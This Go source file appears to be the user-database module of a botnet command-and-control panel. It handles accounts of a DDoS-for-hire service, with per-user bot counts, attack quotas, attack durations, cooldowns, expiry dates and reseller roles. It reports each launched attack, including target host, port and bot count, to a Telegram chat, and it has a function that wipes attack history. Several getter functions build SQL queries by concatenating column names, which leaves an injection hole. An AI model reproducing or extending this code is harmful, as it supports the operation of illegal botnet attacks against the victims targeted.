package database

import (
	"cnc/core/config"
	"cnc/core/slaves"
	"database/sql"
	"errors"
	"fmt"
	"log"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"golang.org/x/crypto/bcrypt"
)

type AccountInfo struct {
	ID           int
	Username     string
	Bots         int
	Admin        bool
	Reseller     bool
	MaxAttacks   int
	TotalAttacks int
	Expiry       time.Time
	MaxTime      int
	Cooldown     int
}

func (db *Database) Users() ([]AccountInfo, error) {
	query, err := db.db.Query("SELECT `id`,`username`, `max_bots`, `admin`, `cooldown`, `maxTime` FROM `users`")
	if err != nil { //err handles properly
		return make([]AccountInfo, 0), err
	}

	var accounts = make([]AccountInfo, 0)

	for query.Next() {
		accounts = append(accounts, AccountInfo{})
		if err := query.Scan(&accounts[len(accounts)-1].ID, &accounts[len(accounts)-1].Username, &accounts[len(accounts)-1].Bots, &accounts[len(accounts)-1].Admin, &accounts[len(accounts)-1].Cooldown, &accounts[len(accounts)-1].MaxTime); err != nil {
			return make([]AccountInfo, 0), err
		}
	}

	return accounts, nil
}

func (db *Database) RemoveUser(username string) error {
	var userID int
	err := db.db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userID)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return fmt.Errorf("user '%s' not found", username)
		}
		return err
	}

	_, err = db.db.Exec("DELETE FROM users WHERE id = ?", userID)
	if err != nil {
		return err
	}

	return nil
}

func (db *Database) DaysUntilExpiry(username string) (int, error) {
	expiryTime, err := db.GetUserExpiry(username)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return 0, err
		}
		return 0, err
	}

	currentTime := time.Now()
	daysUntilExpiry := int(expiryTime.Sub(currentTime).Hours() / 24)

	return daysUntilExpiry, nil
}

func (db *Database) TryLogin(username string, password string, ip string) (bool, AccountInfo, error) {
	rows, err := db.db.Query("SELECT id, username, password, max_bots, admin, reseller, maxAttacks, totalAttacks, expiry FROM users WHERE username = ?", username)
	if err != nil {
		return false, AccountInfo{}, err
	}
	defer func(rows *sql.Rows) {
		err := rows.Close()
		if err != nil {

		}
	}(rows)

	var accInfo AccountInfo
	var hashedPassword string
	var timestamp int64
	var adminInt, resellerInt int

	if rows.Next() {
		err := rows.Scan(&accInfo.ID, &accInfo.Username, &hashedPassword, &accInfo.Bots, &adminInt, &resellerInt, &accInfo.MaxAttacks, &accInfo.TotalAttacks, &timestamp)
		if err != nil {
			fmt.Println(err)
			return false, AccountInfo{}, err
		}

		err = bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password))
		if err != nil {
			fmt.Printf("Login error: %s\r\n", err)
			return false, AccountInfo{}, err
		}

		accInfo.Admin = adminInt == 1
		accInfo.Reseller = resellerInt == 1
		accInfo.Expiry = time.Unix(timestamp, 0)

		return true, accInfo, nil
	} else {
		return false, AccountInfo{}, fmt.Errorf("%s attempted to login.txt to %s, but it's invalid.\r\n", ip, username)
	}
}

func (db *Database) GetUserID(id int) (AccountInfo, error) {
	rows, err := db.db.Query("SELECT `id`, `username`, `max_bots`, `admin`, `cooldown`, `maxTime`, `expiry` FROM `users` WHERE `id` = ?", id)

	if err != nil {
		return AccountInfo{
			ID:           0,
			Username:     "",
			Bots:         0,
			Admin:        false,
			Reseller:     false,
			MaxAttacks:   0,
			TotalAttacks: 0,
			Expiry:       time.Now(),
		}, err
	}

	if !rows.Next() {
		return AccountInfo{
			ID:           0,
			Username:     "",
			Bots:         0,
			Admin:        false,
			Reseller:     false,
			MaxAttacks:   0,
			TotalAttacks: 0,
			Expiry:       time.Now(),
		}, err
	}

	var accInfo AccountInfo
	err = rows.Scan(&accInfo.ID, &accInfo.Username, &accInfo.Bots, &accInfo.Admin, &accInfo.Cooldown, &accInfo.MaxTime, &accInfo.Expiry)
	if err != nil {
		return AccountInfo{}, err
	}
	err = rows.Close()
	if err != nil {
		return AccountInfo{}, err
	}

	return accInfo, nil
}

func (db *Database) CreateUser(username string, password string, maxBots int, userMaxAttacks int, duration int, cooldown int, expiry int64, isAdmin bool, isReseller bool, createdBy string) bool {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println(err)
		return false
	}

	_, err = db.db.Exec(`
        INSERT INTO users (username, password, max_bots, maxAttacks, maxTime, cooldown, expiry, admin, reseller, created_by)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		username,
		hashedPassword,
		maxBots,
		userMaxAttacks,
		duration,
		cooldown,
		expiry,
		isAdmin,
		isReseller,
		createdBy,
	)

	if err != nil {
		fmt.Println(err)
		return false
	}

	return true
}

func (db *Database) GetUserExpiry(username string) (time.Time, error) {
	var expiry time.Time
	err := db.db.QueryRow("SELECT expiry FROM users WHERE username = ?", username).Scan(&expiry)
	if err != nil {
		return time.Time{}, err
	}
	return expiry, nil
}

func (db *Database) Changepw(newPw, username string) error {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPw), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println(err)
		return err
	}

	_, err = db.db.Exec("UPDATE users SET password = ? WHERE username = ?", hashedPassword, username)
	if err != nil {
		fmt.Println(err)
		return err
	}

	return nil
}

func (db *Database) CheckUserCreatedBy(username string, reseller string) bool {
	var createdBy string
	err := db.db.QueryRow("SELECT created_by FROM users WHERE username = ?", username).Scan(&createdBy)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return createdBy == reseller
}

func (db *Database) Getx(userid int) (string, bool) {
	var username string
	err := db.db.QueryRow("SELECT username FROM users WHERE id = ?", userid).Scan(&username)
	if err != nil {
		fmt.Println(err)
		return "", false
	}
	return username, true
}

func (db *Database) Getint(detail, username string) (int, error) {
	var result int
	query := "SELECT " + detail + " FROM `users` WHERE username = ?"
	err := db.db.QueryRow(query, username).Scan(&result)
	if err != nil {
		return 0, err
	}
	return result, nil
}

func (db *Database) Getbool(detail, username string) (bool, error) {
	var result bool
	query := "SELECT " + detail + " FROM `users` WHERE username = ?"
	err := db.db.QueryRow(query, username).Scan(&result)
	if err != nil {
		return false, err
	}
	return result, nil
}

func (db *Database) Getstring(detail, username string) (string, error) {
	var result string
	query := "SELECT " + detail + " FROM `users` WHERE username = ?"
	err := db.db.QueryRow(query, username).Scan(&result)
	if err != nil {
		return "", err
	}
	return result, nil
}

func (db *Database) CleanLogs() bool {
	_, err := db.db.Exec("DELETE FROM history")
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func LogtoTelegram(cmd string, duration string, userId int) {
	method, host, dport, length := parseCommand(cmd)
	bot, err := tgbotapi.NewBotAPI(config.Config.Logs.BotToken)
	if err != nil {
		log.Panic(err)
	}
	startedby, _ := DatabaseConnection.Getx(userId)

	now := time.Now()
	chatID := int64(config.Config.Logs.ChatId)
	msg := tgbotapi.NewMessage(chatID, fmt.Sprintf(
		"Method:%s\n"+
			"Host: %s\n"+
			"Dport: %s\n"+
			"Duration: %s\n"+
			"Size: %s\n"+
			"BotCount: %d\n"+
			"Started: %s\n"+
			"Started by: %s",
		method, host, dport, duration, length, slaves.CL.Count(), now.Format("2006-01-02 15:04:05"), startedby))
	_, err = bot.Send(msg)
	if err != nil {
		log.Panic(err)
	}
}
